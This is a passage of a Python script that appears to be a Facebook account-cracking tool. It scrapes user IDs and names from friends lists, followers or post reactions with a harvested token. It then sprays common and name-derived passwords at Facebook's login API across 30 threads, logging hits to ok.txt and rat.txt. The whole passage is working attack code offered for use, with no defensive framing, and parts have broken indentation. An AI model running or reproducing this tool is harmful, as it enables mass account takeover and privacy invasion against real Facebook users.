		session.headers.update({'User-Agent': vaugent})
		try:
			pass1 = "1234567890"
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
			q = json.loads(data)
			if "access_token" in q and "EAAA" in q:
				print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass1+"\033[0;97m")
				okc+=1
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in data.json()['error_msg']:
					print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass1+"\033[0;97m")
					cpc+=1
					cp = open("rat.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = "123123"
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
					q = json.loads(data)
					if "access_token" in q and "EAAA" in q:
						print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass2+"\033[0;97m")
						okc+=1
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in data.json()['error_msg']:
							print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass2+"\033[0;97m")
							cpc+=1
							cp = open("rat.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = "654321"
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
							q = json.loads(data)
							if "access_token" in q and "EAAA" in q:
								print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass3+"\033[0;97m")
								okc+=1
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in data.json()['error_msg']:
									print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass3+"\033[0;97m")
									cpc+=1
									cp = open("rat.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = "987654321"
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
									q = json.loads(data)
									if "access_token" in q and "EAAA" in q:
										print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass4+"\033[0;97m")
										okc+=1
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in data.json()['error_msg']:
											print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass4+"\033[0;97m")
											cpc+=1
											cp = open("rat.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											pass5 = "121212"
											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
											q = json.loads(data)
											if "access_token" in q and "EAAA" in q:
												print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass5+"\033[0;97m")
												okc+=1
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in data.json()['error_msg']:
													print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass5+"\033[0;97m")
													cpc+=1
													cp = open("rat.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = name.lower().split(' ')[0] + '12345'
													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
													q = json.loads(data)
													if "access_token" in q and "EAAA" in q:
														print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass6+"\033[0;97m")
														okc+=1
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in data.json()['error_msg']:
															print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass6+"\033[0;97m")
															cpc+=1
															cp = open("rat.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = name.lower().split(' ')[1] + '12345'
															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
															q = json.loads(data)
															if "access_token" in q and "EAAA" in q:
																print(" \033[1;32m[EXCELLENT] "+uid+" | "+pass7+"\033[0;97m")
																cpc+=1
																okc+=1
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in data.json()['error_msg']:
																	print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass7+"\033[0;97m")
																	cpc+=1
																	cp = open("rat.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)


		except:
			pass
		loop+=1
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	linex()
	print("")
	print("\033[92;1m BOMBING COMPLETED")
	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	linex()
	print("")
	raw_input("\033[93;1m PRESS ENTER TO BACK ")
	menu()


def crack2():
	global token
	os.system("clear")
	try:
		token = open("token.txt","r").read()
	except IOError:
		print("")
		print("\t\033[91;1m  TOKEN NOT FOUND ")
		time.sleep(1)
		fb_token()
	os.system("clear")
	logo()
	print("")
	print("\t\033[93;1m CHOOSE PATH TO CRACK THROUGH")
	print("")
	print("\033[92;1m  [1] CRACK PUBLIC ID")
	print("\033[93;1m  [2] CRACK FOLLOWERS")
	print("\033[94;1m  [3] CRACK REACTIONS")
	print("\033[95;1m  [4] CRACK FILE")
	print("\033[91;1m  [0] BACK")
	print("")
	crack_select2()
	
def crack_select2():
	select = raw_input("\033[92;1m  CHOOSE : ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		logo()
		print("")
		print("\t\033[92;1m MULTI PUBLIC ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT PUBLIC ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token+"& limit=999999").json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="2":
		os.system("clear")
		logo()
		print("")
		print("      \033[92;1mMULTI FOLLOWERS ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT FOLLOWER ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999").json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  PRIVATE FOLLOWERS, TRY ANOTHER ONE")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="3":
		os.system("clear")
		logo()
		print("")
		print("      \033[92;1mMULTI REACTORS ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT POST ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/reactions?access_token="+token+"&limit=999999").json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  CANNOT SCAN REACTIONS")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="4":
		os.system("clear")
		logo()
		print("")
		print("\t\033[93;1m   AUTO PASS CRACKING")
		print("")
		filelist = raw_input('\033[92;1m  INPUT FILE: ')
		try:
			for line in open(filelist, 'r').readlines():
				id.append(line.strip())
				
		except IOError:
			print("\t\033[91;1m  REQUESTED FILE NOT FOUND")
			print("")
			raw_input("\033[93;1m PRESS ENTER TO BACK")
			crack2()
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t\033[91;1m  SELECT VALID OPTION")
		print("")
		crack_select2()
	os.system("clear")
	logo()
	print("")
	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
	print("\033[92;1m  FB BOMBING HAS STARTED\x1b[0m")
	print("\033[93;1m  WATCH THE MAGIC HAPPEN ✌️😈 \033[92;1m✘\033[91;1m✘\x1b[0m")
	linex()
	def main(arg):
		global loop,okc,cpc
		bi = random.choice([u,k,kk,b,h,hh])
		sys.stdout.write('\r %s[ Cracking ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id),okc,cpc)),
		sys.stdout.flush()
		user=arg
		uid,name=user.split("|")
		vaugent = random.choice(agents)
		session = requests.Session()
		session.headers.update({'User-Agent': vaugent})
		try:
			pass1 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
			q = json.loads(data)
			if "access_token" in q and "EAAA" in q:
				print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass1+"\033[0;97m")
				okc+=1
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q['error_msg']:
					print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass1+"\033[0;97m")
					cpc+=1
					cp = open("rat.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower().split(' ')[1] + name.lower().split(' ')[0]
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
					q = json.loads(data)
					if "access_token" in q and "EAAA" in q:
						print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass2+"\033[0;97m")
						okc+=1
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q['error_msg']:
							print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass2+"\033[0;97m")
							cpc+=1
							cp = open("rat.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower().split(' ')[1] + ' ' + name.lower().split(' ')[0]
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
							q = json.loads(data)
							if "access_token" in q and "EAAA" in q:
								print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass3+"\033[0;97m")
								okc+=1
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q['error_msg']:
									print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass3+"\033[0;97m")
									cpc+=1
									cp = open("rat.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower()
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
									q = json.loads(data)
									if "access_token" in q and "EAAA" in q:
										print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass4+"\033[0;97m")
										okc+=1
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q['error_msg']:
											print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass4+"\033[0;97m")
											cpc+=1
											cp = open("rat.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											pass5 = name.lower().split(' ')[0] + '12'
											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
											q = json.loads(data)
											if "access_token" in q and "EAAA" in q:
												print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass5+"\033[0;97m")
												okc+=1
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q['error_msg']:
													print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass5+"\033[0;97m")
													cpc+=1
													cp = open("rat.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = name.lower().split(' ')[1] + '12'
													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
													q = json.loads(data)
													if "access_token" in q and "EAAA" in q:
														print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass6+"\033[0;97m")
														okc+=1
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q['error_msg']:
															print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass6+"\033[0;97m")
															cpc+=1
															cp = open("rat.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = name.lower().split(' ')[0] + '123'
															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
															q = json.loads(data)
															if "access_token" in q and "EAAA" in q:
																print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass7+"\033[0;97m")
																okc+=1
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q['error_msg']:
																	print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass7+"\033[0;97m")
																	cpc+=1
																	cp = open("rat.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
																else:
																	pass8 = name.lower().split(' ')[1] + '123'
																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																	q = json.loads(data)
																	if "access_token" in q and "EAAA" in q:
																		print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass8+"\033[0;97m")
																		okc+=1
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		oks.append(uid+pass8)
																	else:
																		if "www.facebook.com" in q['error_msg']:
																			print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass8+"\033[0;97m")
																			cpc+=1
																			cp = open("rat.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
																			cps.append(uid+pass8)
																		else:
																  			pass9 = name.lower().split(' ')[0] + '1234'
																  			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass9+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																			q = json.loads(data)
																			if "access_token" in q and "EAAA" in q:
																  			    print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass9+"\033[0;97m")
																  			    okc+=1
																  			    ok = open("ok.txt", "a")
																  			    ok.write(uid+"|"+pass9+"\n")
																  			    ok.close()
																  			    oks.append(uid+pass9)
																			else:
																  			        if "www.facebook.com" in q['error_msg']:
																  			                print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass9+"\033[0;97m")
																  			                cpc+=1
																  			                cp = open("rat.txt", "a")
																  			                cp.write(uid+"|"+pass9+"\n")
																  			                cp.close()
																  			                cps.append(uid+pass9)
																  			        else:		
																					pass10 = name.lower().split(' ')[1] + '1234'
																					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass10+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																					q = json.loads(data)
																					if "access_token" in q and "EAAA" in q:
																						print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass10+"\033[0;97m")
																						okc+=1
																						ok = open("ok.txt", "a")
																						ok.write(uid+"|"+pass10+"\n")
																						ok.close()
																						oks.append(uid+pass10)
																  			 		else:
																  			        		if "www.facebook.com" in q['error_msg']:
																							print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass10+"\033[0;97m")
																							cpc+=1
																							cp = open("rat.txt", "a")
																							cp.write(uid+"|"+pass10+"\n")
																							cp.close()
																							cps.append(uid+pass10)
																						else:
																							pass11 = name.lower().split(' ')[0] + '12345'
																							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass11+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																							q = json.loads(data)
																							if "access_token" in q and "EAAA" in q:
																								print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass11+"\033[0;97m")
																								okc+=1
																								ok = open("ok.txt", "a")
																								ok.write(uid+"|"+pass11+"\n")
																								ok.close()
																								oks.append(uid+pass11)
																							else:
																								if "www.facebook.com" in q['error_msg']:
																									print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass11+"\033[0;97m")
																									cpc+=1
																									cp = open("rat.txt", "a")
																									cp.write(uid+"|"+pass11+"\n")
																									cp.close()
																									cps.append(uid+pass1)
																								else:
																									pass12 = name.lower().split(' ')[1] + '12345'
																									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass12+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																									q = json.loads(data)
																									if "access_token" in q and "EAAA" in q:
																										print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass12+"\033[0;97m")
																										okc+=1
																										ok = open("ok.txt", "a")
																										ok.write(uid+"|"+pass12+"\n")
																										ok.close()
																										oks.append(uid+pass12)
																									else:
																										if "www.facebook.com" in q['error_msg']:
																											print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass12+"\033[0;97m")
																											cpc+=1
																											cp = open("rat.txt", "a")
																											cp.write(uid+"|"+pass12+"\n")
																											cp.close()
																											cps.append(uid+pass12)
																										else:
																											pass13 = "556677"
																											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass13+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																											q = json.loads(data)
																											if "access_token" in q and "EAAA" in q:
																												print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass13+"\033[0;97m")
																												okc+=1
																												ok = open("ok.txt", "a")
																												ok.write(uid+"|"+pass13+"\n")
																												ok.close()
																												oks.append(uid+pass13)
																											else:
																												if "www.facebook.com" in q['error_msg']:
																													print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass13+"\033[0;97m")
																													cpc+=1
																													cp = open("rat.txt", "a")
																													cp.write(uid+"|"+pass13+"\n")
																													cp.close()
																													cps.append(uid+pass13)
																												else:
																													pass14 = "102030"
																													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass14+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																													q = json.loads(data)
																													if "access_token" in q and "EAAA" in q:
																														print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass14+"\033[0;97m")
																														okc+=1
																														ok = open("ok.txt", "a")
																														ok.write(uid+"|"+pass14+"\n")
																														ok.close()
																														oks.append(uid+pass14)
																													else:
																														if "www.facebook.com" in q['error_msg']:
																															print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass14+"\033[0;97m")
																															cpc+=1
																															cp = open("rat.txt", "a")
																															cp.write(uid+"|"+pass14+"\n")
																															cp.close()
																															cps.append(uid+pass14)
																														else:
																															pass15 = "123356"
																															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass15+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_).text
																															q = json.loads(data)
																															if "access_token" in q and "EAAA" in q:
																																print("\r \033[1;32m[EXCELLENT] "+uid+" | "+pass15+"\033[0;97m")
																																okc+=1
																																ok = open("ok.txt", "a")
																																ok.write(uid+"|"+pass15+"\n")
																																ok.close()
																																oks.append(uid+pass15)
																															else:
																																if "www.facebook.com" in q['error_msg']:
																																	print("\r \033[1;33m[CHECKPOINT] "+uid+" | "+pass15+"\033[0;97m")
																																	cpc+=1
																																	cp = open("rat.txt", "a")
